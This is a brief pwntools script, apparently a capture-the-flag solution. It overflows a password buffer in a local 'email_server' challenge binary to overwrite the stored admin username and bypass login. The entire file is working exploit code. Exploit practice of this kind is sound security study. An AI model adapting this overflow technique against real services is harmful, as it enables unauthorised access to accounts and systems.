from pwn import *
# context.log_level = "debug"

# The target binary
binary = "./email_server"
# p = process(binary)
p = remote("localhost", 1337)

# Send guest username to pass the first admin check and is a valid username
p.sendlineafter(b"Enter your username: ", b"guest")

# Craft the payload
# Payload is 
#  admin_password + 0x00 + PADDING    + admin_username + 0x00
payload = "🇦🇩🇲🇮🇳".encode('utf-8') + b"\x00"
payload += b"A" * (32 - len("🇦🇩🇲🇮🇳".encode('utf-8') + b"\x00"))
payload += b"admin\x00"

# Send the payload when we see the password prompt
p.sendlineafter(b"Enter your password: ", payload)

p.interactive() 